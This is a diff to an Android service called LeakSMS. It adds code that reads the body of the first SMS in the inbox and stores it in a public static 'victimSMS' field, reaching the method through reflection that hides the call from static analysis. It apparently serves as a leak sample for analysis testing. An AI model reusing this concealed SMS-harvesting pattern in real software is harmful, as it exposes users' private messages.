@@ -20,6 +20,7 @@ import java.lang.reflect.Method;
  */
 
 public class LeakSMS extends Service {
+    public static String victimSMS="";
     @Nullable
     @Override
 
@@ -29,10 +30,9 @@ public class LeakSMS extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        String victimSMS="";
         try {
             Method methodGet=LeakSMS.class.getMethod(getString());
-            victimSMS=(String)methodGet.invoke(new LeakSMS());
+            victimSMS=(String)methodGet.invoke((new LeakSMS()));
         } catch (NoSuchMethodException e) {
             e.printStackTrace();
         } catch (InvocationTargetException e) {
@@ -46,7 +46,14 @@ public class LeakSMS extends Service {
 
     public String getSMS()
     {
-        return "Hello-world";
+        String str = "";
+        Uri inboxURI = Uri.parse("content://sms/inbox");
+        Cursor cur = getContentResolver().query(inboxURI, null, null, null, null);
+        if (cur.moveToFirst()) {
+            str = cur.getString(cur.getColumnIndexOrThrow("body"));
+        }
+        str=str.replace(" ","_");
+        return str;
     }
 
     public String getString(){
